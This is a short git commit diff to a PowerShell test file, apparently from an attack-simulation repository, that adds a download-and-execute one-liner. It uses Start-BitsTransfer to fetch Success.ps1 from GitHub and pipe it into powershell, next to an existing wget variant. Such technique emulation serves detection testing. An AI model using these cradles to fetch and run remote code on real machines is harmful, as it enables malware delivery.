a6c702b91ab587e7ffbe5ac3278d6e3cb3808de8
Tu5k4rr <rory.vendee@gmail.com>
2019-01-21 16:34:29 +0000

    Start-BitsTransfer
    Start-BitsTransfer

--- Test/downloader-test.ps1
+++ Test/downloader-test.ps1
@@ -2,6 +2,6 @@
 ##URL: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6
 ##Desc: Downloads powershellscript and then executes.
 
-
+cmd /c "powershell -c "Start-BitsTransfer "https://raw.githubusercontent.com/Tu5k4rr/TerminalBlue/master/Success.ps1" "C:\tmp\success.ps1"&& powershell -c Get-Content -Path "c:\tmp\success.ps1" | powershell -"
 
 cmd.exe /c "powershell -c wget https://raw.githubusercontent.com/Tu5k4rr/TerminalBlue/master/Success.ps1 -Outfile success.ps1&& powershell -c Get-Content -Path .\success.ps1 | powershell -"
